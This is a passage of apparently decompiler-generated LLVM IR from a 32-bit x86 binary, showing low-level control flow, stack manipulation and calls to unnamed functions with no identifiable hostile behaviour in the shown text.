  %v0_8049f88.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8049f87

dec_label_pc_8049f87:                             ; preds = %dec_label_pc_8049f63, %dec_label_pc_8049f72
  %v4_8049f67117 = phi i32 [ %v6_8049f67, %dec_label_pc_8049f63 ], [ %v4_8049f7f, %dec_label_pc_8049f72 ]
  %v0_8049f88 = phi i32 [ %v0_8049f67105, %dec_label_pc_8049f63 ], [ %v0_8049f88.pre, %dec_label_pc_8049f72 ]
  %v0_8049f87 = phi i32 [ %v0_8049f89107, %dec_label_pc_8049f63 ], [ %v0_8049f87.pre, %dec_label_pc_8049f72 ]
  %v1_8049f8931 = phi i32 [ %v17_8049f8f106, %dec_label_pc_8049f63 ], [ %v1_8049f84, %dec_label_pc_8049f72 ]
  %v1_8049f87 = add i32 %v0_8049f87, 1
  store i32 %v1_8049f87, i32* @esi, align 4
  %v1_8049f88 = add i32 %v0_8049f88, 1
  store i32 %v1_8049f88, i32* @ebx, align 4
  %v2_8049f89 = add i32 %v1_8049f8931, 32
  %v3_8049f89 = inttoptr i32 %v2_8049f89 to i32*
  %v4_8049f89 = load i32, i32* %v3_8049f89, align 4
  %v5_8049f89 = sub i32 %v1_8049f87, %v4_8049f89
  %v11_8049f89 = xor i32 %v4_8049f89, %v1_8049f87
  %v12_8049f89 = xor i32 %v5_8049f89, %v1_8049f87
  %v13_8049f89 = and i32 %v12_8049f89, %v11_8049f89
  %v14_8049f89 = icmp slt i32 %v13_8049f89, 0
  %v16_8049f89 = icmp slt i32 %v5_8049f89, 0
  %v2_8049f8d = icmp eq i1 %v16_8049f89, %v14_8049f89
  %v1_8049f8f = add i32 %v1_8049f8931, 56
  %v2_8049f8f = inttoptr i32 %v1_8049f8f to i32*
  %v3_8049f8f = load i32, i32* %v2_8049f8f, align 4
  br i1 %v2_8049f8d, label %dec_label_pc_8049f8f, label %dec_label_pc_8049f63

dec_label_pc_8049f8f:                             ; preds = %dec_label_pc_8049f87, %dec_label_pc_8049fa4
  %v2_8049f8f.lcssa = phi i32* [ %v2_8049f8f103, %dec_label_pc_8049fa4 ], [ %v2_8049f8f, %dec_label_pc_8049f87 ]
  %v3_8049f8f.lcssa = phi i32 [ %v3_8049f8f104, %dec_label_pc_8049fa4 ], [ %v3_8049f8f, %dec_label_pc_8049f87 ]
  %v4_8049f8f = add i32 %v3_8049f8f.lcssa, 1
  store i32 %v4_8049f8f, i32* %v2_8049f8f.lcssa, align 4
  %v0_8049f93 = load i32, i32* @esp, align 4
  %v1_8049f93 = add i32 %v0_8049f93, 56
  %v2_8049f93 = inttoptr i32 %v1_8049f93 to i32*
  %v3_8049f93 = load i32, i32* %v2_8049f93, align 4
  %v12_8049f93 = icmp eq i32 %v3_8049f93, 8
  %v1_8049f98 = icmp eq i1 %v12_8049f93, false
  br i1 %v1_8049f98, label %dec_label_pc_8049fa4, label %dec_label_pc_8049f9a

dec_label_pc_8049f9a:                             ; preds = %dec_label_pc_8049f8f
  %v1_8049f9a = add i32 %v0_8049f93, 80
  %v2_8049f9a = inttoptr i32 %v1_8049f9a to i32*
  store i32 0, i32* %v2_8049f9a, align 4
  %v1_8049ff5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049ff5

dec_label_pc_8049fa4:                             ; preds = %dec_label_pc_8049f8f, %dec_label_pc_8049ee5
  %v1_8049f8932 = phi i32 [ %v0_8049f93, %dec_label_pc_8049f8f ], [ %v1_8049f5e, %dec_label_pc_8049ee5 ]
  %v0_8049fa4 = load i32, i32* @edi, align 4
  store i32 %v0_8049fa4, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v2_8049f8991 = add i32 %v1_8049f8932, 32
  %v3_8049f8992 = inttoptr i32 %v2_8049f8991 to i32*
  %v4_8049f8993 = load i32, i32* %v3_8049f8992, align 4
  %v5_8049f8994 = sub i32 0, %v4_8049f8993
  %v13_8049f8997 = and i32 %v4_8049f8993, %v5_8049f8994
  %v14_8049f8998 = icmp slt i32 %v13_8049f8997, 0
  %v16_8049f89100 = icmp slt i32 %v5_8049f8994, 0
  %v2_8049f8d101 = icmp eq i1 %v16_8049f89100, %v14_8049f8998
  %v1_8049f8f102 = add i32 %v1_8049f8932, 56
  %v2_8049f8f103 = inttoptr i32 %v1_8049f8f102 to i32*
  %v3_8049f8f104 = load i32, i32* %v2_8049f8f103, align 4
  br i1 %v2_8049f8d101, label %dec_label_pc_8049f8f, label %dec_label_pc_8049f63.lr.ph

dec_label_pc_8049f63.lr.ph:                       ; preds = %dec_label_pc_8049fa4
  %v4_8049f67.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049f63

dec_label_pc_8049faa:                             ; preds = %dec_label_pc_8049ff5
  %v1_8049faa = add i32 %v0_804a002, 100
  %v2_8049faa = inttoptr i32 %v1_8049faa to i32*
  %v3_8049faa = load i32, i32* %v2_8049faa, align 4
  store i32 %v3_8049faa, i32* @edi, align 4
  %v1_8049fae = add i32 %v0_804a002, 96
  %v2_8049fae = inttoptr i32 %v1_8049fae to i32*
  %v3_8049fae = load i32, i32* %v2_8049fae, align 4
  store i32 %v3_8049fae, i32* %ebx.global-to-local, align 4
  %v2_8049fb5 = add i32 %v3_8049faa, 1028
  %v3_8049fb5 = inttoptr i32 %v2_8049fb5 to i32*
  %v4_8049fb5 = load i32, i32* %v3_8049fb5, align 4
  %v5_8049fb5 = add i32 %v4_8049fb5, %v3_8049fae
  store i32 %v5_8049fb5, i32* @ebx, align 4
  %v3_8049fbb = inttoptr i32 %v0_804a002 to i32*
  store i32 %v0_8049ffd, i32* %v3_8049fbb, align 4
  %v1_8049fbc = call i32 @function_804a688(i32 %stack_var_-2308.8)
  %v1_8049fc1 = add i32 %v1_8049fbc, 1
  store i32 %v1_8049fc1, i32* %eax.global-to-local, align 4
  %v1_8049fc2 = load i32, i32* @esp, align 4
  %v2_8049fc2 = inttoptr i32 %v1_8049fc2 to i32*
  store i32 %v1_8049fc1, i32* %v2_8049fc2, align 4
  %v1_8049fc5 = call i32 @function_804b6c8(i32 %stack_var_-2308.8)
  store i32 %v1_8049fc5, i32* %eax.global-to-local, align 4
  %v1_8049fca = load i32, i32* @ebx, align 4
  %v2_8049fca = inttoptr i32 %v1_8049fca to i32*
  store i32 %v1_8049fc5, i32* %v2_8049fca, align 4
  %v0_8049fcc = load i32, i32* @esi, align 4
  %v1_8049fcc = load i32, i32* @esp, align 4
  %v2_8049fcc = inttoptr i32 %v1_8049fcc to i32*
  store i32 %v0_8049fcc, i32* %v2_8049fcc, align 4
  %v1_8049fcf = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_8049fcf, i32* %eax.global-to-local, align 4
  %v0_8049fd4 = load i32, i32* @esp, align 4
  %v2_8049fd7 = add i32 %v0_8049fd4, 8
  %v3_8049fd7 = inttoptr i32 %v2_8049fd7 to i32*
  store i32 %v1_8049fcf, i32* %v3_8049fd7, align 4
  %v0_8049fd8 = load i32, i32* @esi, align 4
  %v2_8049fd8 = add i32 %v0_8049fd4, 4
  %v3_8049fd8 = inttoptr i32 %v2_8049fd8 to i32*
  store i32 %v0_8049fd8, i32* %v3_8049fd8, align 4
  %v0_8049fd9 = load i32, i32* @edi, align 4
  %v1_8049fd9 = add i32 %v0_8049fd9, 1028
  %v2_8049fd9 = inttoptr i32 %v1_8049fd9 to i32*
  %v3_8049fd9 = load i32, i32* %v2_8049fd9, align 4
  store i32 %v3_8049fd9, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v1_8049fe1 = add i32 %v0_8049fd4, 96
  %v2_8049fe1 = inttoptr i32 %v1_8049fe1 to i32*
  %v3_8049fe1 = load i32, i32* %v2_8049fe1, align 4
  store i32 %v3_8049fe1, i32* %edx.global-to-local, align 4
  %v2_8049fe5 = add i32 %v3_8049fe1, %v3_8049fd9
  %v3_8049fe5 = inttoptr i32 %v2_8049fe5 to i32*
  %v4_8049fe5 = load i32, i32* %v3_8049fe5, align 4
  %v7_8049fe5 = inttoptr i32 %v0_8049fd4 to i32*
  store i32 %v4_8049fe5, i32* %v7_8049fe5, align 4
  %v3_8049fe8 = call i32 @function_804a6b7(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049fe8, i32* %eax.global-to-local, align 4
  %v0_8049fed = load i32, i32* @esp, align 4
  %v1_8049fed = add i32 %v0_8049fed, 96
  %v2_8049fed = inttoptr i32 %v1_8049fed to i32*
  %v3_8049fed = load i32, i32* %v2_8049fed, align 4
  %v4_8049fed = add i32 %v3_8049fed, 4
  store i32 %v4_8049fed, i32* %v2_8049fed, align 4
  %v0_8049ff2 = load i32, i32* @esp, align 4
  %v1_8049ff2 = add i32 %v0_8049ff2, 16
  br label %dec_label_pc_8049ff5

dec_label_pc_8049ff5:                             ; preds = %dec_label_pc_8049f9a, %dec_label_pc_8049faa
  %v1_8049ff5 = phi i32 [ %v1_8049ff5.pre, %dec_label_pc_8049f9a ], [ %v1_8049ff2, %dec_label_pc_8049faa ]
  %v0_8049ff5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049ff5 = add i32 %v1_8049ff5, -4
  %v3_8049ff5 = inttoptr i32 %v2_8049ff5 to i32*
  store i32 %v0_8049ff5, i32* %v3_8049ff5, align 4
  %v0_8049ff6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049ff6 = add i32 %v1_8049ff5, -8
  %v3_8049ff6 = inttoptr i32 %v2_8049ff6 to i32*
  store i32 %v0_8049ff6, i32* %v3_8049ff6, align 4
  %v1_8049ff7 = add i32 %v1_8049ff5, -12
  %v2_8049ff7 = inttoptr i32 %v1_8049ff7 to i32*
  store i32 ptrtoint (i32* @global_var_804d4e4.60 to i32), i32* %v2_8049ff7, align 4
  %v0_8049ffc = load i32, i32* @edi, align 4
  %v2_8049ffc = add i32 %v1_8049ff5, -16
  %v3_8049ffc = inttoptr i32 %v2_8049ffc to i32*
  store i32 %v0_8049ffc, i32* %v3_8049ffc, align 4
  %v0_8049ffd = call i32 @function_804a715()
  store i32 %v0_8049ffd, i32* %eax.global-to-local, align 4
  %v0_804a002 = load i32, i32* @esp, align 4
  %v1_804a005 = icmp eq i32 %v0_8049ffd, 0
  store i32 %v0_8049ffd, i32* @esi, align 4
  %v1_804a009 = icmp eq i1 %v1_804a005, false
  br i1 %v1_804a009, label %dec_label_pc_8049faa, label %dec_label_pc_804a00b

dec_label_pc_804a00b:                             ; preds = %dec_label_pc_8049ff5
  %v1_804a00e = add i32 %v0_804a002, 100
  %v2_804a00e = inttoptr i32 %v1_804a00e to i32*
  %v3_804a00e = load i32, i32* %v2_804a00e, align 4
  %v1_804a012 = add i32 %v3_804a00e, 1028
  %v2_804a012 = inttoptr i32 %v1_804a012 to i32*
  %v3_804a012 = load i32, i32* %v2_804a012, align 4
  store i32 %v3_804a012, i32* %eax.global-to-local, align 4
  %v1_804a018 = add i32 %v3_804a012, 4
  %v2_804a018 = inttoptr i32 %v1_804a018 to i32*
  %v3_804a018 = load i32, i32* %v2_804a018, align 4
  %v6_804a018 = inttoptr i32 %v0_804a002 to i32*
  store i32 %v3_804a018, i32* %v6_804a018, align 4
  %v1_804a01b = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a01b, i32* %eax.global-to-local, align 4
  %v0_804a020 = load i32, i32* @esp, align 4
  %v1_804a020 = add i32 %v0_804a020, 100
  %v2_804a020 = inttoptr i32 %v1_804a020 to i32*
  %v3_804a020 = load i32, i32* %v2_804a020, align 4
  store i32 %v3_804a020, i32* @edi, align 4
  %v1_804a027 = add i32 %v3_804a020, 1028
  %v2_804a027 = inttoptr i32 %v1_804a027 to i32*
  %v3_804a027 = load i32, i32* %v2_804a027, align 4
  store i32 %v3_804a027, i32* %edx.global-to-local, align 4
  %v1_804a02d = add i32 %v3_804a027, 4
  %v2_804a02d = inttoptr i32 %v1_804a02d to i32*
  %v3_804a02d = load i32, i32* %v2_804a02d, align 4
  store i32 %v3_804a02d, i32* %edx.global-to-local, align 4
  %v2_804a030 = add i32 %v0_804a020, 8
  %v3_804a030 = inttoptr i32 %v2_804a030 to i32*
  store i32 %v1_804a01b, i32* %v3_804a030, align 4
  %v0_804a031 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a031 = add i32 %v0_804a031, 12
  store i32 %v1_804a031, i32* %eax.global-to-local, align 4
  %v2_804a034 = add i32 %v0_804a020, 4
  %v3_804a034 = inttoptr i32 %v2_804a034 to i32*
  store i32 %v1_804a031, i32* %v3_804a034, align 4
  %v0_804a035 = load i32, i32* %edx.global-to-local, align 4
  %v3_804a035 = inttoptr i32 %v0_804a020 to i32*
  store i32 %v0_804a035, i32* %v3_804a035, align 4
  %v4_804a036 = call i32 @function_804b35a(i8* %v3_8049f51, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a036, i32* %eax.global-to-local, align 4
  %v0_804a03e = load i32, i32* @edi, align 4
  %v1_804a03e = add i32 %v0_804a03e, 1028
  %v2_804a03e = inttoptr i32 %v1_804a03e to i32*
  %v3_804a03e = load i32, i32* %v2_804a03e, align 4
  %v4_804a03e = icmp eq i32 %v3_804a03e, 0
  br i1 %v4_804a03e, label %dec_label_pc_804a502, label %dec_label_pc_804a40d

dec_label_pc_804a050:                             ; preds = %dec_label_pc_8049b28
  %v0_804a050 = load i32, i32* @edi, align 4
  %v2_804a050 = add i32 %v0_804a536, -4
  %v3_804a050 = inttoptr i32 %v2_804a050 to i32*
  store i32 %v0_804a050, i32* %v3_804a050, align 4
  %v1_804a051 = add i32 %v0_804a536, -8
  %v2_804a051 = inttoptr i32 %v1_804a051 to i32*
  store i32 1024, i32* %v2_804a051, align 4
  %v1_804a056 = add i32 %v0_804a536, -12
  %v2_804a056 = inttoptr i32 %v1_804a056 to i32*
  store i32 0, i32* %v2_804a056, align 4
  %v1_804a058 = add i32 %v0_804a536, 100
  store i32 %v1_804a058, i32* @ebx, align 4
  %v2_804a05c = add i32 %v0_804a536, -16
  %v3_804a05c = inttoptr i32 %v2_804a05c to i32*
  store i32 %v1_804a058, i32* %v3_804a05c, align 4
  %v4_804a05d = call i32 @function_804a6fc(i32 %stack_var_-2308.8, i8 ptrtoint (i32* @0 to i8), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a05d, i32* %eax.global-to-local, align 4
  %v0_804a062 = load i32, i32* @esp, align 4
  %v1_804a062 = inttoptr i32 %v0_804a062 to i32*
  %v3_804a062 = add i32 %v0_804a062, 4
  %v1_804a063 = inttoptr i32 %v3_804a062 to i32*
  store i32 ptrtoint ([27 x i8]* @global_var_804d4e6.61 to i32), i32* %v1_804a063, align 4
  %v0_804a069 = load i32, i32* @ebx, align 4
  store i32 %v0_804a069, i32* %v1_804a062, align 4
  %v2_804a06a = call i32 @function_804a6d6(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804a06a, i32* %eax.global-to-local, align 4
  %v0_804a06f = load i32, i32* @esp, align 4
  %v1_804a06f = inttoptr i32 %v0_804a06f to i32*
  %v2_804a06f = load i32, i32* %v1_804a06f, align 4
  store i32 %v2_804a06f, i32* %eax.global-to-local, align 4
  %v3_804a06f = add i32 %v0_804a06f, 4
  %v1_804a070 = inttoptr i32 %v3_804a06f to i32*
  %v2_804a070 = load i32, i32* %v1_804a070, align 4
  store i32 %v2_804a070, i32* %edx.global-to-local, align 4
  %v1_804a071 = add i32 %v0_804a06f, 100
  %v2_804a071 = inttoptr i32 %v1_804a071 to i32*
  %v3_804a071 = load i32, i32* %v2_804a071, align 4
  store i32 %v3_804a071, i32* %edx.global-to-local, align 4
  %v1_804a075 = add i32 %v3_804a071, 1028
  %v2_804a075 = inttoptr i32 %v1_804a075 to i32*
  %v3_804a075 = load i32, i32* %v2_804a075, align 4
  store i32 %v3_804a075, i32* @eax, align 4
  %v1_804a07b = inttoptr i32 %v3_804a075 to i32*
  %v2_804a07b = load i32, i32* %v1_804a07b, align 4
  store i32 %v2_804a07b, i32* %v1_804a070, align 4
  %v0_804a07d = load i32, i32* @ebx, align 4
  store i32 %v0_804a07d, i32* %v1_804a06f, align 4
  %v2_804a07e = inttoptr i32 %stack_var_-2308.8 to i8*
  %v3_804a07e = call i32 @function_804a698(i8* %v2_804a07e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a07e, i32* %eax.global-to-local, align 4
  %v0_804a083 = load i32, i32* @esp, align 4
  %v1_804a083 = inttoptr i32 %v0_804a083 to i32*
  %v2_804a083 = load i32, i32* %v1_804a083, align 4
  store i32 %v2_804a083, i32* %edi.global-to-local, align 4
  %v3_804a083 = add i32 %v0_804a083, 4
  %v1_804a084 = inttoptr i32 %v3_804a083 to i32*
  %v2_804a084 = load i32, i32* %v1_804a084, align 4
  store i32 %v2_804a084, i32* @eax, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_804d501.62 to i32), i32* %v1_804a084, align 4
  %v0_804a08a = load i32, i32* @ebx, align 4
  store i32 %v0_804a08a, i32* %v1_804a083, align 4
  %v3_804a08b = call i32 @function_804a698(i8* %v2_804a07e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a08b, i32* %eax.global-to-local, align 4
  %v0_804a090 = load i32, i32* @esp, align 4
  %v1_804a090 = inttoptr i32 %v0_804a090 to i32*
  %v3_804a090 = add i32 %v0_804a090, 4
  %v1_804a091 = inttoptr i32 %v3_804a090 to i32*
  %v1_804a092 = add i32 %v0_804a090, 100
  %v2_804a092 = inttoptr i32 %v1_804a092 to i32*
  %v3_804a092 = load i32, i32* %v2_804a092, align 4
  %v1_804a096 = add i32 %v3_804a092, 1028
  %v2_804a096 = inttoptr i32 %v1_804a096 to i32*
  %v3_804a096 = load i32, i32* %v2_804a096, align 4
  store i32 %v3_804a096, i32* @eax, align 4
  %v1_804a09c = add i32 %v3_804a096, 4
  %v2_804a09c = inttoptr i32 %v1_804a09c to i32*
  %v3_804a09c = load i32, i32* %v2_804a09c, align 4
  store i32 %v3_804a09c, i32* %v1_804a091, align 4
  %v0_804a09f = load i32, i32* @ebx, align 4
  store i32 %v0_804a09f, i32* %v1_804a090, align 4
  %v3_804a0a0 = call i32 @function_804a698(i8* %v2_804a07e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a0a0, i32* %eax.global-to-local, align 4
  %v0_804a0a5 = load i32, i32* @esp, align 4
  %v1_804a0a5 = inttoptr i32 %v0_804a0a5 to i32*
  %v2_804a0a5 = load i32, i32* %v1_804a0a5, align 4
  store i32 %v2_804a0a5, i32* @eax, align 4
  %v3_804a0a5 = add i32 %v0_804a0a5, 4
  %v1_804a0a6 = inttoptr i32 %v3_804a0a5 to i32*
  %v2_804a0a6 = load i32, i32* %v1_804a0a6, align 4
  store i32 %v2_804a0a6, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([88 x i8]* @global_var_804d50c.63 to i32), i32* %v1_804a0a6, align 4
  %v0_804a0ac = load i32, i32* @ebx, align 4
  store i32 %v0_804a0ac, i32* %v1_804a0a5, align 4
  %v3_804a0ad = call i32 @function_804a698(i8* %v2_804a07e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a0ad, i32* %eax.global-to-local, align 4
  %v0_804a0b2 = load i32, i32* @esp, align 4
  %v1_804a0b2 = add i32 %v0_804a0b2, 100
  %v2_804a0b2 = inttoptr i32 %v1_804a0b2 to i32*
  %v3_804a0b2 = load i32, i32* %v2_804a0b2, align 4
  store i32 %v3_804a0b2, i32* %edi.global-to-local, align 4
  %v0_804a0b9 = load i32, i32* @global_var_804f6a4.55, align 4
  store i32 %v0_804a0b9, i32* @esi, align 4
  %v1_804a0bf = add i32 %v3_804a0b2, 1026
  %v2_804a0bf = inttoptr i32 %v1_804a0bf to i8*
  %v3_804a0bf = load i8, i8* %v2_804a0bf, align 1
  %v2_804a0c5 = add i8 %v3_804a0bf, 1
  %v14_804a0c5 = zext i8 %v2_804a0c5 to i32
  %v16_804a0c5 = and i32 %v3_804a0ad, -256
  %v17_804a0c5 = or i32 %v14_804a0c5, %v16_804a0c5
  store i32 %v17_804a0c5, i32* @eax, align 4
  %v1_804a0d98 = icmp eq i32 %v0_804a0b9, 0
  %v1_804a0db10 = icmp eq i1 %v1_804a0d98, false
  br i1 %v1_804a0db10, label %dec_label_pc_804a0c9, label %dec_label_pc_804a0dd

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a050, %dec_label_pc_804a0d6
  %v0_804a0d6 = phi i32 [ %v3_804a0d6, %dec_label_pc_804a0d6 ], [ %v0_804a0b9, %dec_label_pc_804a050 ]
  %v1_804a0c9 = inttoptr i32 %v0_804a0d6 to i32*
  %v2_804a0c9 = load i32, i32* %v1_804a0c9, align 4
  %v3_804a0c9 = urem i32 %v2_804a0c9, 16777216
  %v4_804a0c9 = icmp eq i32 %v3_804a0c9, 0
  br i1 %v4_804a0c9, label %dec_label_pc_804a0d6, label %dec_label_pc_804a0d1

dec_label_pc_804a0d1:                             ; preds = %dec_label_pc_804a0c9
  %v1_804a0d1 = add i32 %v0_804a0d6, 2
  %v2_804a0d1 = inttoptr i32 %v1_804a0d1 to i8*
  %v3_804a0d1 = load i8, i8* %v2_804a0d1, align 1
  %v16_804a0d1 = icmp eq i8 %v3_804a0d1, %v2_804a0c5
  br i1 %v16_804a0d1, label %dec_label_pc_804a0e1, label %dec_label_pc_804a0d6

dec_label_pc_804a0d6:                             ; preds = %dec_label_pc_804a0d1, %dec_label_pc_804a0c9
  %v1_804a0d6 = add i32 %v0_804a0d6, 8
  %v2_804a0d6 = inttoptr i32 %v1_804a0d6 to i32*
  %v3_804a0d6 = load i32, i32* %v2_804a0d6, align 4
  store i32 %v3_804a0d6, i32* @esi, align 4
  %v1_804a0d9 = icmp eq i32 %v3_804a0d6, 0
  %v1_804a0db = icmp eq i1 %v1_804a0d9, false
  br i1 %v1_804a0db, label %dec_label_pc_804a0c9, label %dec_label_pc_804a0dd

dec_label_pc_804a0dd:                             ; preds = %dec_label_pc_804a0d6, %dec_label_pc_804a050
  %v1_804a0dd = add i32 %v0_804a0b2, 40
  %v2_804a0dd = inttoptr i32 %v1_804a0dd to i32*
  %v3_804a0dd = load i32, i32* %v2_804a0dd, align 4
  store i32 %v3_804a0dd, i32* @esi, align 4
  br label %dec_label_pc_804a0e1

dec_label_pc_804a0e1:                             ; preds = %dec_label_pc_804a0d1, %dec_label_pc_804a0dd
  %v2_804a0e1 = add i32 %v0_804a0b2, 12
  %v3_804a0e1 = inttoptr i32 %v2_804a0e1 to i32*
  store i32 %v17_804a0c5, i32* %v3_804a0e1, align 4
  %v0_804a0e2 = load i32, i32* @eax, align 4
  %v2_804a0e2 = add i32 %v0_804a0b2, 8
  %v3_804a0e2 = inttoptr i32 %v2_804a0e2 to i32*
  store i32 %v0_804a0e2, i32* %v3_804a0e2, align 4
  %v0_804a0e3 = load i32, i32* @esi, align 4
  %v1_804a0e3 = add i32 %v0_804a0e3, 4
  %v2_804a0e3 = inttoptr i32 %v1_804a0e3 to i32*
  %v3_804a0e3 = load i32, i32* %v2_804a0e3, align 4
  %v5_804a0e3 = add i32 %v0_804a0b2, 4
  %v6_804a0e3 = inttoptr i32 %v5_804a0e3 to i32*
  store i32 %v3_804a0e3, i32* %v6_804a0e3, align 4
  %v1_804a0e6 = add i32 %v0_804a0b2, 116
  store i32 %v1_804a0e6, i32* @ebx, align 4
  %v3_804a0ea = inttoptr i32 %v0_804a0b2 to i32*
  store i32 %v1_804a0e6, i32* %v3_804a0ea, align 4
  %v3_804a0eb = call i32 @function_804a698(i8* %v2_804a07e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a0eb, i32* %eax.global-to-local, align 4
  %v0_804a0f0 = load i32, i32* @esp, align 4
  %v1_804a0f0 = inttoptr i32 %v0_804a0f0 to i32*
  %v2_804a0f0 = load i32, i32* %v1_804a0f0, align 4
  store i32 %v2_804a0f0, i32* @edi, align 4
  %v3_804a0f0 = add i32 %v0_804a0f0, 4
  %v1_804a0f1 = inttoptr i32 %v3_804a0f0 to i32*
  %v2_804a0f1 = load i32, i32* %v1_804a0f1, align 4
  store i32 %v2_804a0f1, i32* @eax, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_804d564.64 to i32), i32* %v1_804a0f1, align 4
  %v0_804a0f7 = load i32, i32* @ebx, align 4
  store i32 %v0_804a0f7, i32* %v1_804a0f0, align 4
  %v3_804a0f8 = call i32 @function_804a698(i8* %v2_804a07e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a0f8, i32* %eax.global-to-local, align 4
  %v0_804a0fd = load i32, i32* @ebx, align 4
  %v1_804a0fd = load i32, i32* @esp, align 4
  %v2_804a0fd = inttoptr i32 %v1_804a0fd to i32*
  store i32 %v0_804a0fd, i32* %v2_804a0fd, align 4
  %v1_804a100 = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a100, i32* %eax.global-to-local, align 4
  %v0_804a105 = load i32, i32* @esp, align 4
  %v1_804a105 = add i32 %v0_804a105, -4
  %v2_804a105 = inttoptr i32 %v1_804a105 to i32*
  store i32 16384, i32* %v2_804a105, align 4
  %v2_804a10a = add i32 %v0_804a105, -8
  %v3_804a10a = inttoptr i32 %v2_804a10a to i32*
  store i32 %v1_804a100, i32* %v3_804a10a, align 4
  %v0_804a10b = load i32, i32* @ebx, align 4
  %v2_804a10b = add i32 %v0_804a105, -12
  %v3_804a10b = inttoptr i32 %v2_804a10b to i32*
  store i32 %v0_804a10b, i32* %v3_804a10b, align 4
  %v1_804a10c = add i32 %v0_804a105, 100
  %v2_804a10c = inttoptr i32 %v1_804a10c to i32*
  %v3_804a10c = load i32, i32* %v2_804a10c, align 4
  store i32 %v3_804a10c, i32* %eax.global-to-local, align 4
  %v1_804a110 = add i32 %v3_804a10c, -8
  %v2_804a110 = inttoptr i32 %v1_804a110 to i32*
  %v3_804a110 = load i32, i32* %v2_804a110, align 4
  %v5_804a110 = add i32 %v0_804a105, -16
  %v6_804a110 = inttoptr i32 %v5_804a110 to i32*
  store i32 %v3_804a110, i32* %v6_804a110, align 4
  %v0_804a113 = call i32 @function_804b516()
  store i32 %v0_804a113, i32* %eax.global-to-local, align 4
  %v0_804a118 = load i32, i32* @esp, align 4
  store i32 1, i32* @edx, align 4
  %tmp82 = icmp slt i32 %v0_804a113, 1
  br i1 %tmp82, label %dec_label_pc_804a133, label %dec_label_pc_804a124

dec_label_pc_804a124:                             ; preds = %dec_label_pc_804a0e1
  %v1_804a124 = add i32 %v0_804a118, 116
  %v2_804a124 = inttoptr i32 %v1_804a124 to i32*
  %v3_804a124 = load i32, i32* %v2_804a124, align 4
  store i32 %v3_804a124, i32* %edx.global-to-local, align 4
  %v1_804a128 = add i32 %v3_804a124, 1026
  %v2_804a128 = inttoptr i32 %v1_804a128 to i8*
  %v3_804a128 = load i8, i8* %v2_804a128, align 1
  %v4_804a128 = add i8 %v3_804a128, 1
  store i8 %v4_804a128, i8* %v2_804a128, align 1
  store i32 3, i32* @edx, align 4
  br label %dec_label_pc_804a133

dec_label_pc_804a133:                             ; preds = %dec_label_pc_804a0e1, %dec_label_pc_804a124
  %v0_804a133 = load i32, i32* @ebp, align 4
  store i32 %v0_804a133, i32* @eax, align 4
  %v0_804a135 = call i32 @function_8049717()
  store i32 %v0_804a135, i32* %eax.global-to-local, align 4
  %v0_804a13a = load i32, i32* @esi, align 4
  %v1_804a13a = load i32, i32* @esp, align 4
  %v2_804a13a = add i32 %v1_804a13a, 24
  %v3_804a13a = inttoptr i32 %v2_804a13a to i32*
  store i32 %v0_804a13a, i32* %v3_804a13a, align 4
  br label %dec_label_pc_804a52a

dec_label_pc_804a143:                             ; preds = %dec_label_pc_8049b28
  %v2_804a143 = add i32 %v0_804a536, -4
  %v3_804a143 = inttoptr i32 %v2_804a143 to i32*
  store i32 %v3_8049b28, i32* %v3_804a143, align 4
  %v1_804a144 = add i32 %v0_804a536, -8
  %v2_804a144 = inttoptr i32 %v1_804a144 to i32*
  store i32 1024, i32* %v2_804a144, align 4
  %v1_804a149 = add i32 %v0_804a536, -12
  %v2_804a149 = inttoptr i32 %v1_804a149 to i32*
  store i32 0, i32* %v2_804a149, align 4
  %v1_804a14b = add i32 %v0_804a536, 100
  store i32 %v1_804a14b, i32* @ebx, align 4
  %v2_804a14f = add i32 %v0_804a536, -16
  %v3_804a14f = inttoptr i32 %v2_804a14f to i32*
  store i32 %v1_804a14b, i32* %v3_804a14f, align 4
  %v4_804a150 = call i32 @function_804a6fc(i32 %stack_var_-2308.8, i8 ptrtoint (i32* @0 to i8), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a150, i32* %eax.global-to-local, align 4
  %v0_804a155 = load i32, i32* @esp, align 4
  %v1_804a155 = inttoptr i32 %v0_804a155 to i32*
  %v2_804a155 = load i32, i32* %v1_804a155, align 4
  store i32 %v2_804a155, i32* %eax.global-to-local, align 4
  %v3_804a155 = add i32 %v0_804a155, 4
  %v1_804a156 = inttoptr i32 %v3_804a155 to i32*
  %v2_804a156 = load i32, i32* %v1_804a156, align 4
  store i32 %v2_804a156, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_804d575.65 to i32), i32* %v1_804a156, align 4
  %v0_804a15c = load i32, i32* @ebx, align 4
  store i32 %v0_804a15c, i32* %v1_804a155, align 4
  %v2_804a15d = call i32 @function_804a6d6(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804a15d, i32* %eax.global-to-local, align 4
  %v0_804a162 = load i32, i32* @esp, align 4
